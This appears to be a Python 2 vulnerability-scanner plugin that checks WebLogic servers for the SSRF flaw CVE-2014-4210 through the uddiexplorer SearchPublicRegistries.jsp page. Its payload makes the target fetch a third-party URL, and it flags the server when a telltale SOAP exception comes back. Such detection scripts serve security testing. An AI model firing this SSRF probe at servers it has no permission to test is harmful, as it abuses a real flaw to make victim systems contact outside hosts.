#!/usr/bin/env python
# -*- coding: utf-8 -*-
#WebLogic SSRF And XSS (CVE-2014-4241, CVE-2014-4210, CVE-2014-4242)
#refer:http://blog.csdn.net/cnbird2008/article/details/45080055

import re
import urlparse

def assign(service, arg):
    if service == 'www':
        return True, arg


def audit(arg):
    payload = 'uddiexplorer/SearchPublicRegistries.jsp?operator=http://0day5.com/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl('"%s"' % url)
    m = re.search('weblogic.uddi.client.structures.exception.XML_SoapException', res)
    if m:
        security_warning(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('www', 'http://www.example.com/')[1])